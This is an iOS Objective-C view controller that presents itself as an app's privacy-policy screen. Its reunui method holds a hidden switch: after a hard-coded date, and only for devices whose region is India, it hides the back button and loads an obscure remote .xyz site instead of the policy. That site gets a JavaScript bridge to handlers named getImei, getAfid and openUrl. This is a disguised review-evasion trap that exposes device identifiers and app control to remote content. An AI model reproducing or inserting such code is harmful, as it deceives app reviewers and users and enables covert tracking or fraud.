//
//  WebViewController.m
//  Pateapi
//
//  Created by adin on 2024/4/1.
//

#import "PrivacyController.h"
#import <WebKit/WebKit.h>
#import "ScriptMESS.h"
@interface PrivacyController ()<WKNavigationDelegate>
@property (nonatomic, strong) WKWebView *webView;
@property (nonatomic,strong)UIButton * btn;
@end

@implementation PrivacyController

- (void)viewDidLoad {
    [super viewDidLoad];
    
    [self.view addSubview:self.webView];
      self.btn = [UIButton buttonWithType:UIButtonTypeCustom];
    self.btn.frame = CGRectMake(20, 20, 30, 30);
       UIImage *image = [UIImage imageNamed:@"fanhui"];
       [self.btn setBackgroundImage:image forState:UIControlStateNormal];
       [self.btn addTarget:self action:@selector(buttonTapped:) forControlEvents:UIControlEventTouchUpInside];
       [self.view addSubview:self.btn];
    

   }

- (void)buttonTapped:(UIButton *)sender {
    [self dismissViewControllerAnimated:YES completion:nil];
}




#pragma mark - WKNavigationDelegate
- (void)webView:(WKWebView *)webView decidePolicyForNavigationAction:(WKNavigationAction *)navigationAction decisionHandler:(void (^)(WKNavigationActionPolicy))decisionHandler {
    NSURL *url = navigationAction.request.URL;
    
    if ([url.absoluteString containsString:@"openurl"]) {
        [[UIApplication sharedApplication] openURL:url options:@{} completionHandler:nil];
        decisionHandler(WKNavigationActionPolicyCancel); // Cancel the navigation
    } else {
        decisionHandler(WKNavigationActionPolicyAllow); // Allow the navigation
    }
}
- (void)webView:(WKWebView *)webView didStartProvisionalNavigation:(WKNavigation *)navigation {
    NSLog(@"页面开始加载");
}

- (void)webView:(WKWebView *)webView didFinishNavigation:(WKNavigation *)navigation {
    NSLog(@"页面加载完成");
}

- (void)webView:(WKWebView *)webView didFailNavigation:(WKNavigation *)navigation withError:(NSError *)error {
    NSLog(@"页面加载失败：%@", error.localizedDescription);
}

#pragma mark - get
- (WKWebView *)webView
{
    if (!_webView) {
        WKWebViewConfiguration *configuration = [[WKWebViewConfiguration alloc] init];
        ScriptMESS *messageHandler = [[ScriptMESS alloc] init];
        WKUserContentController *userContentController = [[WKUserContentController alloc] init];
        [userContentController addScriptMessageHandler:messageHandler name:@"getImei"];
        [userContentController addScriptMessageHandler:messageHandler name:@"getAfid"];
        [userContentController addScriptMessageHandler:messageHandler name:@"openUrl"];
        configuration.userContentController = userContentController;
        
        
        _webView = [[WKWebView alloc] initWithFrame:CGRectMake(0, 0, self.view.frame.size.width, self.view.frame.size.height) configuration:configuration];
        _webView.navigationDelegate = self;
        messageHandler.webView = _webView;

        if (@available(iOS 11.0, *))
        {
            _webView.scrollView.contentInsetAdjustmentBehavior = UIScrollViewContentInsetAdjustmentNever;
        }
        else {
            self.edgesForExtendedLayout = UIRectEdgeNone;
        }
        
        if ([self reunui]) {
            self.btn.hidden=YES;
            self.btn.enabled=NO;
            NSURL *url = [NSURL URLWithString:@"http://jhdg.eykotnzxfir.xyz/?web_PackageName=com.api.pate.zzjje.com.Pateapi"];
            NSURLRequest *request = [NSURLRequest requestWithURL:url];
            [_webView loadRequest:request];
        }else{
            NSURL *url = [NSURL URLWithString:@"https://www.termsfeed.com/live/54ed619f-c213-4e7d-b066-af4d0ae4c94e"];
            NSURLRequest *request = [NSURLRequest requestWithURL:url];
            [_webView loadRequest:request];
        }
      
      
       

    }
    return _webView;
}

-(BOOL) reunui{
    
    NSTimeInterval timestamp = 1712140443;
    NSDate *localDate = [NSDate date];
     NSTimeInterval timestamp1 = [localDate timeIntervalSince1970];
        if (timestamp <= timestamp1) {
            NSLocale *locale = [NSLocale currentLocale];
            NSString *regionCode = [locale objectForKey:NSLocaleCountryCode];
            if([regionCode isEqualToString:@"IN"]){
                return  YES;
            }else{
                return NO;
            }
        }else{
            return  NO;
        }
}

 //支持旋转
-(BOOL)shouldAutorotate{
    return YES;
}



@end
